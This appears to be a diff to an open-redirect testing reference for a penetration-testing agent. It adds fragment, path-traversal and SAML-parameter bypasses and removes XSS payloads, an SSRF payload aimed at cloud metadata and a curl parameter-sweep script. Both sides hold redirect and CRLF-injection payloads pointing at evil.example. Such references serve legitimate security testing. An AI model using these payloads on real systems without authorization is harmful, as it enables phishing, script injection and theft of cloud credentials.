@@ -13,21 +13,10 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 ## Common Vulnerable Parameters
 
 ```
-?redirect=
-?url=
-?next=
-?return=
-?goto=
-?dest=
-?destination=
-?redir=
-?redirect_url=
-?return_to=
-?checkout_url=
-?continue=
-?forward=
-?target=
+RelayState, SAMLRequest (SSO), post_logout_redirect_uri
 ```
+
+The generic names (`redirect`, `next`, `return_to`, `goto`, …) are in `agent/references/gf-patterns/redirect.md`.
 
 ## URL Parsing Confusion
 
@@ -116,40 +105,22 @@ https://target.example@evil.example
 //target.example%40evil.example
 ```
 
+## Fragment/Hash
+```
+https://trusted.example#@evil.example
+```
+Some validators do not account for the fragment. Depending on parsing order, the final navigation target may differ from what the validator evaluated.
+
+## Path Traversal in Relative Redirects
+```
+/redirect?url=/../../evil.example
+/redirect?url=/..//evil.example
+```
+If the server builds the redirect URL by appending the parameter to a base path, path traversal may escape the intended domain.
+
 ## CRLF + Open Redirect
 
 ```
 /%0d%0aLocation:%20http://evil.example
 /redirect?url=%0d%0aLocation:%20http://evil.example
-```
-
-## Open Redirect to XSS
-
-```
-javascript:alert(document.domain)//
-java%0d%0ascript%0d%0a:alert(0)
-data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-```
-
-## Open Redirect to SSRF
-
-```
-# If the server follows redirects server-side
-?url=http://evil.example/redirect?to=http://169.254.169.254/latest/meta-data/
-```
-
-## Testing Automation
-
-```bash
-# Test common parameters with redirect payload
-vigil assess kali exec --technique OPEN-REDIRECT \
-  --intent "open-redirect parameter sweep over the common redirect parameter names" \
-  --probe-kind payload --phase consume-test --timeout 600 -- bash -c '
-  TARGET="https://target.example"
-  for p in redirect url next return goto dest redir redirect_url return_to; do
-    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?$p=https://evil.example")
-    LOCATION=$(curl -s -I "$TARGET/?$p=https://evil.example" | grep -i "location:")
-    echo "$p -> $CODE $LOCATION"
-  done
-'
 ```
